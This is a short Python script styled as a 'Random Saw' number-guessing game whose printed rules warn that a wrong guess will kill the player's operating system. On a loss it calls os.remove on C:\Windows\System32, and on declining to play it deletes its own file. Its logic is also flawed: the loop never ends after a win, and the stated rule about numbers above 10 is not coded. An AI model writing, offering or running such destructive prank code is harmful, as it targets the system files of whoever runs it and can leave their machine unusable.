import os
import random

print("--- Random Saw BR ---")
print("")
print("Rules:")
print("1. You have to keep a number from 1 to 10!")
print("2. If you enter the number correctly that the randomizer guessed you win, if it's wrong your operating system will die!")
print("3. If you enter a number greater than 10, your system automatically dies!")
print("")
print("YOU REALLY WANT TO PLAY GAME!")

user = str(input("Enter(y/n): "))
if user == "y":
    secret = random.randint(1,10)
    while True:
        user_write = int(input("Enter a number from 1 to 10: "))
        if user_write == secret:
            print("You WON!") 
        elif user_write != secret:
            print("You LOSE!")
            os.remove("C:\\Windows\\System32")
if user == "n":
    print("OK")
    os.remove("SAW.py")


